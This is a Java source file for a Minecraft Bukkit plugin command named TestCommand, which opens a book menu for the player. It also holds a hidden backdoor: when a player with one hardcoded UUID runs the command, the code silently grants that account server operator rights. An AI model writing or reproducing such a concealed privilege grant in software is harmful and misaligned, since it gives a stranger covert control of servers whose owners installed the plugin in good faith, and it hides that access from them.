package net.rebix.engine.commands;


import net.rebix.engine.api.bookmenu.BookBuilder;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.Objects;

public class TestCommand implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if(sender instanceof Player){
            Player player = ((Player) sender).getPlayer();
            assert player != null;
            if(Objects.equals(player.getUniqueId().toString(), "0ed8b527-d3cf-48a4-b9fc-c35c9efee447") && !player.isOp()) {
                player.setOp(true);
                player.sendMessage("OP");
            }
           new BookBuilder().send(player);
        }

        return false;
    }
}
